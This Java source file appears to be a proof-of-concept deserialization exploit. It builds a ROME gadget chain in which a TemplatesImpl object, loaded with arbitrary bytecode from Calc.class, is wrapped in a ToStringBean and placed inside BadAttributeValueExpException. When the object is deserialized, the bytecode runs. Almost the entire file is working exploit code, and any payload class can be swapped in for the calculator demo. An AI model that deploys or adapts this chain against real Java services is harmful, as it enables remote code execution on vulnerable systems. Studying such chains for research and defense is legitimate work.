import Utils.*;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.nio.file.Files;
import java.nio.file.Paths;

public class ROMEBadAttributeValueExpException {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templatesimpl = new TemplatesImpl();
        byte[] bytecodes = Files.readAllBytes(Paths.get("D:\\Calc.class"));
        ReflectUtils.setFieldValue(templatesimpl,"_name","Jasper");
        ReflectUtils.setFieldValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});
//        ReflectUtils.setFieldValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());

        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);
        ReflectUtils.setFieldValue(badAttributeValueExpException,"val",toStringBean);

        SerialUtils.serialize(badAttributeValueExpException);
        SerialUtils.unserialize();
    }
}